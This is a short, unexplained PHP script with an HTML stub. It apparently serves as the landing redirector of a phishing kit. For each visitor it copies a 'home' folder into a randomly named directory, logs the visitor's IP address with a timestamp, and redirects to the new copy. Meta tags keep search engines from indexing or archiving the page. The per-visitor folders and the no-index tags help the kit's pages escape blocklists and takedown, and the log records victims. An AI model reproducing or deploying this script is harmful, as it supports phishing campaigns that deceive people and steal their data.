<?
$random=rand(0,100000000000);
function recurse_copy($src,$random) {
$dir = opendir($src);
@mkdir($random);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($src . '/' . $file) ) {
recurse_copy($src . '/' . $file,$random . '/' . $file);
}
else {
copy($src . '/' . $file,$random . '/' . $file);
}
}
}
closedir($dir);
}
$src="home";
recurse_copy( $src, $random );
$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('log.txt', $line . PHP_EOL, FILE_APPEND);
header("Location: " . $random);
exit();
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<meta name="robots" content="noindex">
<meta name="robots" content="noarchive">
</html>